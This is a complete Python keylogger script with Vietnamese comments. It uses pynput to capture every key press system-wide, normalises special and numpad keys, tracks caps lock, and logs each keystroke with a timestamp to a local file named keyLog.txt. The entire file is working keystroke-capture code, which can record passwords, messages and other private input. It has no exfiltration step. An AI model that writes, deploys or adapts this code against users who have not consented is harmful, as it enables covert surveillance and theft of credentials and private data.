from pynput.keyboard import Listener
import logging

log_dir = r"<địa_chỉ_file_xuất_kết_quả>"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

capslockIsOn = False

def on_press(key):
    key = str(key)
    key = key.replace("'", "")

    global capslockIsOn
    
    if key == "Key.esc":
        key = ""
    if key == "Key.f1":
        key = ""
    if key == "Key.f2":
        key = ""
    if key == "Key.f3":
        key = ""
    if key == "Key.f4":
        key = ""
    if key == "Key.f5":
        key = ""
    if key == "Key.f6":
        key = ""
    if key == "Key.f7":
        key = ""
    if key == "Key.f8":
        key = ""
    if key == "Key.f9":
        key = ""
    if key == "Key.f10":
        key = ""
    if key == "Key.f11":
        key = ""
    if key == "Key.f12":
        key = ""
    if key == "Key.insert":
        key = ""
    if key == "Key.delete":
        key = "delete"
    if key == "[`]":
        key = "`"
    
    # * Xóa một ký tự trong file khi gõ Backspace
    if key == "Key.backspace":
        key = "backspace"
    if key == "Key.tab":
        key = "tab"
    
    # * Khi nhấn caps_lock thì sẽ thay đổi giá trị biến capslockIsOn
    if key == "Key.caps_lock":
        if capslockIsOn == False:
            capslockIsOn = True
        else:
            capslockIsOn = False
        key = ""
    
    if key == "Key.enter":
        key = "enter"
    if key == "Key.shift" or key == "Key.shift_r":
        key = ""
    if key == "Key.ctrl_l" or key == "Key.ctrl_r":
        key = ""
    if key == "Key.alt_l" or key == "Key.alt_gr":
        key = ""
    if key == "Key.cmd":
        key = ""
    if key == "Key.up":
        key = ""
    if key == "Key.down":
        key = ""
    if key == "Key.left":
        key = ""
    if key == "Key.right":
        key = "" 
    if key == "Key.page_up":
        key = ""
    if key == "Key.page_down":
        key = ""
    if key == "Key.menu":
        key = ""
    if key == "Key.space":
        key = "space"

    # * Bàn phím bên phải:
    if key == "<96>":
        key = "0"
    if key == "<97>":
        key = "1"
    if key == "<98>":
        key = "2"
    if key == "<99>":
        key = "3"
    if key == "<100>":
        key = "4"
    if key == "<101>":
        key = "5"
    if key == "<102>":
        key = "6"
    if key == "<103>":
        key = "7"
    if key == "<104>":
        key = "8"
    if key == "<105>":
        key = "9"
    if key == "<110>":
        key = "."
    if key == "Key.num_lock":
        key = ""

    # * Hàm chuyển đổi khi capslockIsOn == True
    if capslockIsOn == True:
        key = key.upper()
    
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()
